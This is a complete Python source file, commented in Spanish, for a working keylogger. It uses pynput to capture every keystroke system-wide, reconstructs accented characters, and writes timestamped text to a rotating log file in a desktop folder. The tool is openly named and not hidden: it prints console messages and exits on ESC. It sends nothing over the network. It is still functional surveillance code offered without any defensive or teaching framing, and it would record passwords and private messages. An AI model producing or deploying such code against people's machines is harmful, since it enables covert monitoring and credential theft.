import os
import sys
import logging
import threading
import ctypes
from logging.handlers import RotatingFileHandler
from typing import Optional
from pynput import keyboard


# ---------------------------------------------------------
# TABLA DE COMPOSICIÓN DE TILDES
# ---------------------------------------------------------
COMBINACIONES_ACENTOS = {
    "´": {"a": "á", "e": "é", "i": "í", "o": "ó", "u": "ú",
          "A": "Á", "E": "É", "I": "Í", "O": "Ó", "U": "Ú"},
    "`": {"a": "à", "e": "è", "i": "ì", "o": "ò", "u": "ù",
          "A": "À", "E": "È", "I": "Ì", "O": "Ò", "U": "Ù"},
    "¨": {"a": "ä", "e": "ë", "i": "ï", "o": "ö", "u": "ü",
          "A": "Ä", "E": "Ë", "I": "Ï", "O": "Ö", "U": "Ü"},
    "^": {"a": "â", "e": "ê", "i": "î", "o": "ô", "u": "û",
          "A": "Â", "E": "Ê", "I": "Î", "O": "Ô", "U": "Û"},
    "~": {"a": "ã", "o": "õ", "n": "ñ",
          "A": "Ã", "O": "Õ", "N": "Ñ"},
    "¸": {"c": "ç", "C": "Ç"},
}

TECLAS_MUERTAS = set(COMBINACIONES_ACENTOS.keys())


# ---------------------------------------------------------
# UTILIDAD: obtener la ruta del escritorio en cualquier SO
# ---------------------------------------------------------
def _escritorio_real() -> str:
    """
    Devuelve la ruta real del escritorio del usuario.
    - Windows: usa la API del sistema (respeta OneDrive).
    - Linux/Mac: busca ~/Desktop o ~/Escritorio.
    - Último recurso: la carpeta del usuario.
    """
    # --- Windows ---
    if sys.platform.startswith("win"):
        try:
            buf = ctypes.create_unicode_buffer(260)
            # CSIDL_DESKTOPDIRECTORY = 0x0010
            ctypes.windll.shell32.SHGetFolderPathW(None, 0x0010, None, 0, buf)
            if buf.value:
                return buf.value
        except Exception:
            pass

        return os.path.join(
            os.environ.get("USERPROFILE", os.path.expanduser("~")),
            "Desktop"
        )

    # --- Linux / Mac ---
    home = os.path.expanduser("~")
    for nombre in ("Desktop", "Escritorio", "desktop", "escritorio"):
        ruta = os.path.join(home, nombre)
        if os.path.isdir(ruta):
            return ruta

    return home


class Keylogger:
    def __init__(
        self,
        carpeta_destino: Optional[str] = None,
        limite_buffer: int = 200,
        intervalo_volcado: int = 10,
    ) -> None:
        # --- Carpeta destino ---
        if carpeta_destino is None:
            carpeta_destino = os.path.join(_escritorio_real(), "Keylogger")
        self.carpeta = carpeta_destino
        os.makedirs(self.carpeta, exist_ok=True)

        # --- Archivo de log ---
        self.ruta_log = os.path.join(self.carpeta, "keylog.txt")

        # --- Buffer y límites ---
        self.buffer: str = ""
        self.limite_buffer: int = limite_buffer

        # --- Estado de modificadores ---
        self.shift_activo: bool = False
        self.caps_lock_activo: bool = False

        # --- Estado de teclas muertas ---
        self.ultima_tecla_muerta: Optional[str] = None

        # --- Volcado periódico ---
        self._temporizador: Optional[threading.Timer] = None
        self._intervalo_volcado: int = intervalo_volcado

        # --- Logging ---
        self._configurar_logging()

    def _configurar_logging(self) -> None:
        # Logger del keylog (archivo)
        self.logger = logging.getLogger(f"keylogger.{id(self)}")
        self.logger.setLevel(logging.INFO)

        if not self.logger.handlers:
            handler = RotatingFileHandler(
                self.ruta_log,
                maxBytes=1_000_000,
                backupCount=3,
                encoding="utf-8",
            )
            formatter = logging.Formatter(
                "%(asctime)s - %(message)s",
                datefmt="%Y-%m-%d %H:%M:%S",
            )
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
            self.logger.propagate = False

        # Logger de estado (consola)
        self.logger_estado = logging.getLogger(f"keylogger.estado.{id(self)}")
        self.logger_estado.setLevel(logging.INFO)

        if not self.logger_estado.handlers:
            handler_consola = logging.StreamHandler()
            handler_consola.setFormatter(
                logging.Formatter("[%(levelname)s] %(message)s")
            )
            self.logger_estado.addHandler(handler_consola)
            self.logger_estado.propagate = False

    def __repr__(self) -> str:
        return (
            f"Keylogger(carpeta='{self.carpeta}', "
            f"buffer={len(self.buffer)}/{self.limite_buffer}, "
            f"log='{self.ruta_log}')"
        )

    def volcar(self) -> None:
        if self.buffer.strip():
            self.logger.info(self.buffer)
        self.buffer = ""

    def _volcado_periodico(self) -> None:
        self.volcar()
        self._temporizador = threading.Timer(
            self._intervalo_volcado, self._volcado_periodico
        )
        self._temporizador.daemon = True
        self._temporizador.start()

    def _aplicar_modificadores(self, char: str) -> str:
        if not char.isalpha():
            return char
        if self.shift_activo != self.caps_lock_activo:
            return char.upper()
        return char.lower()

    def _resolver_composicion(self, char: str) -> str:
        if self.ultima_tecla_muerta is None:
            return char

        tabla = COMBINACIONES_ACENTOS.get(self.ultima_tecla_muerta, {})
        if char in tabla:
            resultado = tabla[char]
            self.ultima_tecla_muerta = None
            return resultado

        self.buffer += self.ultima_tecla_muerta
        self.ultima_tecla_muerta = None
        return char

    def al_presionar(self, key) -> None:
        # --- Modificadores ---
        if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
            self.shift_activo = True
            return

        if key == keyboard.Key.caps_lock:
            self.caps_lock_activo = not self.caps_lock_activo
            return

        if key in (keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                   keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
                   keyboard.Key.alt_gr, keyboard.Key.cmd,
                   keyboard.Key.cmd_l, keyboard.Key.cmd_r,
                   keyboard.Key.menu):
            return

        # --- Teclas especiales ---
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.buffer += " "
                self.ultima_tecla_muerta = None
            elif key == keyboard.Key.enter:
                self.buffer += "\n"
                self.volcar()
                self.ultima_tecla_muerta = None
                return
            elif key == keyboard.Key.tab:
                self.buffer += "\t"
            elif key == keyboard.Key.backspace:
                if self.ultima_tecla_muerta is not None:
                    self.ultima_tecla_muerta = None
                elif len(self.buffer) > 0:
                    self.buffer = self.buffer[:-1]
                return
            return

        if char is None:
            return

        # --- Teclas muertas ---
        if char in TECLAS_MUERTAS:
            if self.ultima_tecla_muerta is not None:
                self.buffer += self.ultima_tecla_muerta
            self.ultima_tecla_muerta = char
            return

        # --- Carácter normal ---
        char_final = self._aplicar_modificadores(char)
        char_final = self._resolver_composicion(char_final)
        self.buffer += char_final

        if len(self.buffer) >= self.limite_buffer:
            self.volcar()

    def al_soltar(self, key) -> Optional[bool]:
        if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
            self.shift_activo = False
            return None
        if key == keyboard.Key.esc:
            self.volcar()
            self.logger_estado.info("Saliendo y guardando buffer pendiente...")
            return False
        return None

    def ejecutar(self) -> None:
        self.logger_estado.info("Escuchando teclado... (ESC para salir)")
        self._volcado_periodico()
        try:
            with keyboard.Listener(
                on_press=self.al_presionar,
                on_release=self.al_soltar
            ) as escucha:
                escucha.join()
        except KeyboardInterrupt:
            self.volcar()
            self.logger_estado.info("Interrumpido por el usuario.")
        finally:
            if self._temporizador:
                self._temporizador.cancel()
            for h in self.logger.handlers:
                h.close()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.ejecutar()